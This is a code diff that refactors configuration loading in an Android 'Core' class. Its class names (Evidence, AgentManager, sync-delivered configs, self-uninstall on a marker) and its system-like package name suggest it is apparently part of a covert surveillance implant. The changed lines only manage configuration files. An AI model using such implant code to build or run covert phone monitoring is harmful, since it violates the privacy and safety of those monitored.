@@ -19,6 +19,7 @@ import com.android.service.action.SubAction;
 import com.android.service.action.UninstallAction;
 import com.android.service.agent.AgentManager;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
 import com.android.service.event.EventManager;
 import com.android.service.evidence.Evidence;
@@ -127,15 +128,16 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " Info: init task"); //$NON-NLS-1$
 				}
 
+				int confLoaded=taskInit();
 				// viene letta la conf e vengono fatti partire agenti e eventi
-				if (taskInit() == false) {
+				if (confLoaded == ConfType.Error) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
 					}
 					break;
 				} else {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " TaskInit() OK"); //$NON-NLS-1$
+						Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
 					}
 				}
 
@@ -262,24 +264,24 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @return false if any fatal error
 	 */
-	private boolean taskInit() {
+	private int taskInit() {
 		try {
 			Path.makeDirs();
 
 			final Markup markup = new Markup(0);
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
-				return false;
+				return ConfType.Error;
 			}
 
 			// Identify the device uniquely
 			final Device device = Device.self();
-
-			if (!loadConf()) {
+			int ret = loadConf();
+			if (ret == 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
 				}
-				return false;
+				return ConfType.Error;
 			}
 
 			// Start log dispatcher
@@ -293,7 +295,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
 				}
-				return false;
+				return ConfType.Error;
 			}
 
 			if (Cfg.DEBUG) {
@@ -304,7 +306,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$
 				}
-				return false;
+				return ConfType.Error;
 			}
 
 			if (Cfg.DEBUG) {
@@ -313,7 +315,8 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
 			}
-			return true;
+
+			return ret;
 
 		} catch (final GeneralException rcse) {
 			if (Cfg.DEBUG) {
@@ -328,8 +331,18 @@ public class Core extends Activity implements Runnable {
 			}
 		}
 
-		return false;
+		return ConfType.Error;
 
+	}
+
+	public boolean verifyNewConf() {
+		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
+		boolean loaded = false;
+		if (file.exists()) {
+			loaded = loadConfFile(file, false);
+		}
+
+		return loaded;
 	}
 
 	/**
@@ -340,31 +353,35 @@ public class Core extends Activity implements Runnable {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	public boolean loadConf() throws GeneralException {
+	public int loadConf() throws GeneralException {
 		boolean loaded = false;
 
+		int ret = ConfType.Error;
 		// tries to load the file got from the sync, if any.
-		AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
+		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 
 		if (file.exists()) {
-			loaded = loadConfFile(file);
+			loaded = loadConfFile(file, true);
 
 			if (!loaded) {
 				Evidence.info(Messages.getString("30.2")); //$NON-NLS-1$
 				file.delete();
 			} else {
 				Evidence.info(Messages.getString("30.3")); //$NON-NLS-1$
-				file.rename(Path.conf() + Configuration.ACTUAL_CONF);
+				file.rename(Path.conf() + ConfType.ActualConf);
+				ret = ConfType.NewConf;
 			}
 		}
 
 		// get the actual configuration
 		if (!loaded) {
-			file = new AutoFile(Path.conf() + Configuration.ACTUAL_CONF);
+			file = new AutoFile(Path.conf() + ConfType.ActualConf);
 			if (file.exists()) {
-				loaded = loadConfFile(file);
+				loaded = loadConfFile(file, true);
 				if (!loaded) {
 					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
+				} else {
+					ret = ConfType.ActualConf;
 				}
 			}
 		}
@@ -378,17 +395,21 @@ public class Core extends Activity implements Runnable {
 			final Configuration conf = new Configuration(resource);
 
 			// Load the configuration
-			loaded = conf.LoadConfiguration();
+			loaded = conf.loadConfiguration(true);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
 			}
+
+			if (loaded) {
+				ret = ConfType.ResourceConf;
+			}
 		}
 
-		return loaded;
+		return ret;
 	}
 
-	private boolean loadConfFile(AutoFile file) throws GeneralException {
+	private boolean loadConfFile(AutoFile file, boolean instantiate) {
 		boolean loaded;
 		final byte[] resource = file.read(8);
 
@@ -396,7 +417,7 @@ public class Core extends Activity implements Runnable {
 		final Configuration conf = new Configuration(resource);
 
 		// Load the configuration
-		loaded = conf.LoadConfiguration();
+		loaded = conf.loadConfiguration(instantiate);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
 		}
@@ -499,12 +520,23 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (reloadConf): START");
 		}
-		stopAll();
-		boolean ret = taskInit();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (reloadConf): END");
+
+		if (verifyNewConf()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (reloadConf): valid conf");
+			}
+			stopAll();
+			int ret = taskInit();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (reloadConf): END");
+			}
+			return ret != ConfType.Error;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (reloadConf): invalid conf");
+			}
+			return false;
 		}
-		return ret;
 	}
 
 }
